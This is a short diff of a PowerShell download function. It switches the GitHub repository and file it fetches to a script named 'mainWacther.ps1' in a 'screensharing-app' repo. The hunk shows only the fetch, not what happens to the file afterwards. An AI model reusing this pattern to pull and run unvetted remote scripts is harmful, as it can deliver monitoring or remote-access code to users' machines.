@@ -140,8 +140,8 @@ function Donwload-File {
     }
 
     $owner = "ProgrammerJibon"
-    $repo = "wactherHelper"
-    $path = "sys7.py"
+    $repo = "screensharing-app"
+    $path = "home/mainWacther.ps1"
     $apiUrl = "https://api.github.com/repos/$owner/$repo/contents/$path"
 
     $response = Invoke-RestMethod -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }
